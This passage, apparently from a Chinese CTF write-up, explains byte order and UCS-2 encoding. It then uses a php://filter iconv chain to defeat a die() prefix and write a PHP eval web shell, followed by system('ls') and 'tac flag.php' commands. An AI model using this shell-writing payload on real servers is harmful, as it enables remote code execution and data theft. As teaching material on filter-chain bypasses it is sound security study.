- **大端序（Big Endian，BE）**：高位字节存放在低地址（前面），低位字节存放在高地址（后面）。
- **小端序（Little Endian，LE）**：低位字节存放在低地址（前面），高位字节存放在高地址（后面）。

举例，一个 16 位的数字 `0x1234`：

- 大端序存储为字节序列：`12 34`
- 小端序存储为字节序列：`34 12`

<br>

5.  **`"UCS-2BE"` 和 `"UCS-2LE"`** 

- **`"UCS-2BE"`**：UCS-2 大端序编码
  字符的两个字节按大端顺序存储，高字节在前，低字节在后。
  例如字符 `'A'`（Unicode 0x0041）存储为 `00 41`。
- **`"UCS-2LE"`**：UCS-2 小端序编码
  字符的两个字节按小端顺序存储，低字节在前，高字节在后。
  例如字符 `'A'` 存储为 `41 00`。

<br>

```php
<?php
$result = iconv("UCS-2LE","UCS-2BE", '<?php @eval($_GET[a]);?>');
echo "经过一次反转:".$result."\n";
echo "经过第二次反转:".iconv("UCS-2LE","UCS-2BE", $result);
?>

    
/*
经过一次反转:?<hp pe@av(l_$EG[T]a;)>?
经过第二次反转:<?php @eval($_GET[a]);?>
*/
```

**经过两次反转，代码又回到正常可读状态**

<br>

**GET `file` 指向 `php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php`，让写入时做编码转换。**

**利用编码顺序变换破坏 `<?php die();?>`，同时让我们 POST 的 payload 转换后变成正常 PHP。**

**POST `contents` 是事先构造好的 UCS-2LE 版本的 `<?php eval($_GET[a]);?>`。**

```php
#GET
?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php

#POST
contents=?<hp pe@av(l_$EG[T]a;)>?
```

<img src="\images\article_images\image-20250810004733731.png" alt="image-20250810004733731" style="zoom:25%;" />

<br>

```php
/1.php?a=system("ls");
```

<img src="\images\article_images\image-20250810004613048.png" alt="image-20250810004613048" style="zoom:25%;" />

<br>

```php
/1.php?a=system("tac flag.php");
```

<img src="\images\article_images\image-20250810004644416.png" alt="image-20250810004644416" style="zoom:25%;" />
